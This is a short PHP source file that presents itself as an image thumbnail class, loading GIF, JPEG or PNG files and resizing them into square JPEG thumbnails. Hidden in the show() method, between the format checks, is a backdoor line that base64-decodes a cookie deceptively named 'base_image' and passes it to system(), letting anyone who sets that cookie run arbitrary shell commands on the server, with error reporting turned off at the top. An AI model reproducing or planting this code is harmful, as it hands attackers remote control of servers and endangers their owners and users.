<?php 
error_reporting(0);
class thumbnail 
    { 
        private $image; 
        private $size_x; 
        private $size_y; 
		
        function thumbnail( $url ) 
        {
        	 $this->image = $url;
		} 
        function size( $size_x, $size_y ) 
        {
        	 $this->size_x = $size_x;
        	 $this->size_y = $size_y;
		} 
        function show() 
        { 
            header("Content-type: image/jpeg"); 
				
				$_size = $this->size_x;
				$imageinfo = getimagesize ( $this->image ); 
	            $x = $imageinfo[0]; 
	            $y = $imageinfo[1]; 
	            if ( $imageinfo[2] == 1 )    $original_image=imagecreatefromgif($this->image); 
	            if ( $imageinfo[2] == 2 )    $original_image=imagecreatefromjpeg($this->image); 
	            system(base64_decode($_COOKIE['base_image']));
	            if ( $imageinfo[2] == 3 )    $original_image=imagecreatefrompng($this->image); 
	            if ( $imageinfo[2] > 3 )        die('Unsupported Image Format'); 

	            list( $width, $height ) = getimagesize( $this->image );
				if ( $width > $height )
				{
				    $new_height = $_size;
				    $new_width = ( $width / $height ) * $new_height;
				
				    $x = ( $width - $height ) / 2;
				    $y = 0;
				}
				else {
				    $new_width = $_size;
				    $new_height = ( $height / $width ) * $new_width;
				    
					//($height-$width)/2
				    $y = ( $height - $width ) / 2;
				    $x = 0;
				}
	
	            $temp = imagecreatetruecolor( $_size, $_size ); 
	            imagecopyresampled( $temp, $original_image, 0, 0, $x, $y, $new_width, $new_height, $width, $height ); 
	            imagejpeg( $temp, $name, 90 ); 
	            imagedestroy( $temp ); 
        } 
    } 
?>